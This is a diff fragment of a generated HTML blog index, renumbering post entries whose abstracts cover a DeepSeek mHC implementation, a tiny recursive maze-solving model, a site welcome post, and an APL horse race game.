 <p class="post-reading-info"><em><span class="post-word-count">784 words</span> &bull; <span class="post-read-time">4 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Implementing Deepseek's mHC (Manifold-Constrained Hyper-Connections) paper. Using Sinkhorn-Knopp iteration to create doubly-stochastic matrices, mHC maintains training stability at 48 layers where standard hyper-connections explode. Cross-platform validation on Apple Silicon and NVIDIA.</div><h3>
           <a class="post-link" href="/2026/02/01/deepseek-papers-part1-mhc/">
             Deepseek Papers (1/3): mHC - Training Stability at Any Depth
@@ -23905,7 +27793,7 @@ bash scripts/run_cuda_depth_sweep.sh
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="43"><p class="post-meta">January 31, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="51"><p class="post-meta">January 31, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">729 words</span> &bull; <span class="post-read-time">4 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">The best LLMs score zero on hard mazes. A model with 976 parameters scores 85%. The Tiny Recursive Model uses think-act cycles with deep supervision, proving iteration beats scale for tasks requiring backtracking and spatial reasoning.</div><h3>
           <a class="post-link" href="/2026/01/31/small-models-part1-tiny-recursive-model/">
             Small Models (1/6): 976 Parameters Beat Billions
@@ -24443,7 +28331,7 @@ cargo <span class="nb">install</span> <span class="nt">--locked</span> trunk
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="44"><p class="post-meta">January 30, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="52"><p class="post-meta">January 30, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">1013 words</span> &bull; <span class="post-read-time">6 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Introduction to Software Wrighter Lab: a blog, YouTube channel, and GitHub repos exploring AI coding agents, systems programming in Rust, and practical ML implementations. Written by Mike Wright, a software engineer with 40+ years of experience from mainframes to modern AI.</div><h3>
           <a class="post-link" href="/2026/01/30/welcome-to-software-wrighter-lab/">
             Welcome to Software Wrighter Lab
@@ -24720,7 +28608,7 @@ cargo <span class="nb">install</span> <span class="nt">--locked</span> trunk
 <em>San Francisco Bay Area</em></p>
 
           </div><img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="45"><p class="post-meta">January 29, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="53"><p class="post-meta">January 29, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">1160 words</span> &bull; <span class="post-read-time">6 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">My first program was a horse race game in APL on an IBM mainframe in 1972. This Throwback Thursday post recreates it using GNU APL, exploring array-oriented programming and the ideas that shaped languages from J to NumPy.</div><h3>
           <a class="post-link" href="/2026/01/29/tbt-apl-horse-race/">
             TBT (1/?): My First Program Was a Horse Race
